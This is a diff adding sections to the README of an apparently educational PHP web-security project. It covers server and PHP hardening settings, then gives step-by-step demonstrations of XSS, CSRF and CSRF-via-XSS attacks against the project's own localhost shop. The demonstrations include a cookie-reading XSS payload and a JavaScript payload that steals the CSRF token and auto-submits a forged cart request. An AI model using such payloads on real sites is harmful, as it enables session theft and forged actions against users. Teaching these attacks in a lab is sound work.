@@ -86,3 +86,119 @@ INSERT INTO products (name, description, price, stock, image) VALUES
 - If the login is successful, reset the counter.
 
 --------------------------------
+## Server and PHP configuration and protection from attacks
+**Protection from attacks**: Giving an attacker specific information about version
+  numbers will greatly simplify the process of attacking the server. In Apache, the
+  directive ServerTokens is used to control what information is given to clients.<br>
+  ServerTokens Prod Apache<br>
+  ServerTokens Major Apache/2<br>
+  ServerTokens Minor Apache/2.2<br>
+  ServerTokens Min Apache/2.2.14<br>
+  ServerTokens OS Apache/2.2.14 (Ubuntu)<br>
+  ServerTokens Full Apache/2.2.14 (Ubuntu) PHP/5.3.2-1ubuntu4.9<br>
+**Action**: change the conf "ServerTokens Full" to "ServerTokens Prod"<br>
+**How**: go to C:\xampp\apache\conf\extra\httpd-default.conf and change the line "ServerTokens Full" to "ServerTokens Prod"<br><br>
+
+**Protection from attack**: PHP will by default send information about the fact that PHP is used and which version. It can be valuable information for an attacker.
+  <br>**Action**: By default, an X-Powered-By header is added to the HTTP response, specifying the PHP version in use. This information can be suppressed using the expose php = Off directive. Some combinations are given below.<br>
+  **How**: go to following files and change the line "expose_php = On" to "expose_php = Off"<br>
+  "C:\xampp\php\php.ini" and "C:\xampp\php\php.ini-development" and "C:\xampp\php\windowsXamppPhp\php.ini-development" and "C:\xampp\php\php.ini-production" and "C:\xampp\php\windowsXamppPhp\php.ini-production"
+  <br><br>
+
+**Protection from attack**: once the application is in production, errors reporting should be turned off. Errors can give valuable information to an attacker, e.g., file paths, file names, uninitialized variables, and arguments to functions, which in the worst case could include passwords to databases used.
+  <br>**Action**: Error reporting is controlled in php.ini. The directive display errors specifies if errors should be displayed on the screen. This defaults to On but should be turned off in production stage.
+  <br>**How**: go to following files and change the line "display_errors = On" to "display_errors = Off"
+  <br>"C:\xampp\php\php.ini" and "C:\xampp\php\php.ini-development" and "C:\xampp\php\windowsXamppPhp\php.ini-development" and "C:\xampp\php\php.ini-production" and "C:\xampp\php\windowsXamppPhp\php.ini-production"
+  <br><br>**Protection from attack**: Instead, errors should be logged to a file.
+  <br>**Action**: This can be done by setting log errors = On and specifying the file to log to using the directive error log.
+  <br>**How**: go to following files and change the line "log_errors = Off" to "log_errors = On"
+  <br>"C:\xampp\php\php.ini" and "C:\xampp\php\php.ini-development" and "C:\xampp\php\windowsXamppPhp\php.ini-development" and "C:\xampp\php\php.ini-production" and "C:\xampp\php\windowsXamppPhp\php.ini-production"
+  <br><br>Additionally, go to C:\xampp\php and create a file called "logs" and in that file create a file called "php_errors_log.txt"
+  Then go to following files and change the line "error_log = php_errors_log" to "error_log = C:\xampp\php\logs\php_errors_log.txt"
+
+
+
+**Wither or not to add the httpOnly flag to the cookie, which makes it
+  inaccessible to browser scripting languages such as JavaScript.
+  session.cookie_httponly=1**
+**Wither or not to add the secure flag to the cookie, which makes it only
+  accessible over a secure connection such as HTTPS.
+  session.cookie_secure =1**
+
+**The SameSite cookie attribute can prevent the browser from sending cookies along
+  with cross-site requests. This can be useful to mitigate CSRF (Cross-Site Request Forgery) attacks
+  session.cookie_samesite="Strict"**
+
+
+
+**Another protection is of course to not allow the session ID to be sent in
+  the URL at all. This is accomplished using session.use only cookies = 1**
+
+
+--------------------------------
+## To see example How the attack can work and the code can be vulnerable to it, do the following:
+### XSS attack: 
+1. Go to the search.php and comment the lines 89 and 107 and remove the comments from lines 90,108.
+2. Go to  any page and enter the following in the search field: <script>alert(document.cookie)</script>
+3. Click on the login button and you will see a pop up with the cookie information.
+
+### CSRF attack: 
+1. Go to the cart.php and comment the lines 2-6.
+2. Go to the index.php and comment the lines 3-5 , 8-12, 27-31 and 116. 
+3. Go to the search.php and comment the lines 3-5 , 19-21, 27-31 and 67. 
+4. Go to Csrf.html and modify "webSecurityProject" to your project localhost name.
+5. Open CSRF.html and click on the button and you will see that the cart is updated with the product.
+
+### CSRF using XSS attack:
+1. Go to the cart.php and comment the lines 2-6.
+2. Go to the index.php and comment the lines 3-5 , 8-12, 27-31 and 116.
+3. Go to the search.php and comment the lines 3-5 , 19-21, 27-31 and 67.
+4. 
+```
+  <script>
+    
+        /* Fetch the CSRF token */
+        var tokenElement = document.querySelector('input[name="csrf_token"]');
+        if (!tokenElement) {
+            console.error('CSRF token element not found.');
+        } else {
+            var token = tokenElement.value;
+
+            /* Create a new form */
+            var form = document.createElement('form');
+            form.action = 'http://localhost/webSecurityProject/index.php';
+            form.method = 'POST';
+
+            /* Create the hidden input fields */
+            var product_id = document.createElement('input');
+            product_id.type = 'hidden';
+            product_id.name = 'product_id';
+            product_id.value = '1';
+
+            var product_price = document.createElement('input');
+            product_price.type = 'hidden';
+            product_price.name = 'product_price';
+            product_price.value = '10000.00';
+            
+            var add_to_cart = document.createElement('input');
+            add_to_cart.type = 'hidden';
+            add_to_cart.name = 'add_to_cart';
+
+            var csrf_token = document.createElement('input');
+            csrf_token.type = 'hidden';
+            csrf_token.name = 'csrf_token';
+            csrf_token.value = token;
+
+            /* Append the input fields to the form */
+            form.appendChild(product_id);
+            form.appendChild(product_price);
+            form.appendChild(add_to_cart);
+            form.appendChild(csrf_token);
+
+            /* Append the form to the body */
+            document.body.appendChild(form);
+
+            /* Submit the form */
+            form.submit();
+        };
+</script>
